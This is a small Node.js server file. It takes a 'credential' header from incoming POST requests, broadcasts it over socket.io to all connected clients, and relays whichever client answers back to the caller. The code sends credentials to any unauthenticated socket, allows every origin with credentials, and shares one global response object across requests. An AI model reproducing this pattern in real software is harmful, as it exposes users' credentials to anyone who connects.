const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));

const server = http.Server(app);
server.listen(23393);

const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  }
});

var response;
app.post('/', function (req, res) {
  io.emit('credential', req.get('credential'));
  setTimeout(() => {
    res.status(503);
    res.json({
      'status': 'Tidak dapat terhubung server'
    });
  }, 10000);
  response = res;
})

io.on('connection', (socket) => {
  socket.on('response', (data) => {
    response.status(data.code);
    response.json(data.data)
  });
});